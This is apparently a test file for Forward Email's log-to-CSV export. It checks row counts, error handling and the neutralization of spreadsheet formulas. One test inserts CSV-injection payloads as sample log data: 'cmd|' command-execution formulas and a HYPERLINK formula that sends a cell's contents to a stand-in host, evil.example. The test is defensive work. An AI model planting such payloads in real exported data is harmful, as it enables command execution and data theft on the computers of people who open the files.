/**
 * Copyright (c) Forward Email LLC
 * SPDX-License-Identifier: BUSL-1.1
 */

const process = require('node:process');
const zlib = require('node:zlib');

const test = require('ava');
const mongoose = require('mongoose');

const utils = require('../utils');
const Logs = require('#models/logs');
const getLogsCsv = require('#helpers/get-logs-csv');

test.before(utils.setupMongoose);

const now = new Date();
const query = {
  created_at: { $gte: new Date(now.getTime() - 60_000), $lte: now }
};

test.before(async () => {
  // the query hints the created_at index
  await Logs.collection.createIndex({ created_at: 1 });
  const docs = [];
  for (let i = 0; i < 5000; i++) {
    const _id = new mongoose.Types.ObjectId();
    docs.push({
      _id,
      id: _id.toString(),
      message: 'delivered',
      bounce_category: 'none',
      meta: { session: { id: `session-${i}`, fingerprint: `fp-${i}` } },
      created_at: now,
      updated_at: now
    });
  }

  await Logs.collection.insertMany(docs);
});

test.after.always(utils.teardownMongoose);

test.serial('returns the CSV gzip-compressed with every row', async (t) => {
  const { count, gzip } = await getLogsCsv(now, query, true);
  t.is(count, 5000);
  const csv = zlib.gunzipSync(gzip).toString();
  const lines = csv.trim().split('\n');
  t.is(lines.length, 5001);
  t.true(lines[0].includes('Log ID'));
});

test.serial(
  'rejects instead of hanging when the file cannot be written',
  async (t) => {
    const tmpdir = process.env.TMPDIR;
    process.env.TMPDIR = '/nonexistent-directory-for-logs-csv';
    t.teardown(() => {
      if (tmpdir === undefined) delete process.env.TMPDIR;
      else process.env.TMPDIR = tmpdir;
    });

    const result = await Promise.race([
      getLogsCsv(now, query, true).then(
        () => 'resolved',
        (err) => err.code
      ),
      new Promise((resolve) => {
        setTimeout(resolve, 30_000, 'timed out').unref();
      })
    ]);

    t.is(result, 'ENOENT');
  }
);

test.serial(
  'neutralizes spreadsheet formulas in values from external senders',
  async (t) => {
    const at = new Date(now.getTime() - 10 * 60_000);
    const _id = new mongoose.Types.ObjectId();
    await Logs.collection.insertOne({
      _id,
      id: _id.toString(),
      message: 'bounced',
      bounce_category: 'other',
      err: {
        response: '@SUM(1+1)*cmd|" /C calc"!A0',
        responseCode: 550
      },
      meta: {
        session: {
          id: 'session-formula',
          headers: {
            Subject: '=HYPERLINK("https://evil.example/?"&A1,"Click")',
            'Message-ID': '+1+cmd|"/C calc"!A0',
            To: '-2+3'
          },
          envelope: {
            mailFrom: { address: 'sender@example.com' },
            rcptTo: [{ address: 'to@example.com' }]
          }
        }
      },
      created_at: at,
      updated_at: at
    });

    const { count, gzip } = await getLogsCsv(
      now,
      { created_at: { $gte: new Date(at.getTime() - 1000), $lte: at } },
      true
    );
    t.is(count, 1);
    const [, row] = zlib.gunzipSync(gzip).toString().trim().split('\n');
    const cells = row.slice(1, -1).split('","');
    // SMTP Response, To, Subject and Message-ID columns
    t.is(cells[7], `'@SUM(1+1)*cmd|"" /C calc""!A0`);
    t.is(cells[11], `'-2+3`);
    t.is(cells[12], `'=HYPERLINK(""https://evil.example/?""&A1,""Click"")`);
    t.is(cells[13], `'+1+cmd|""/C calc""!A0`);
    // ordinary values are left alone
    t.is(cells[14], 'sender@example.com');
    t.is(cells[8], '550');
  }
);
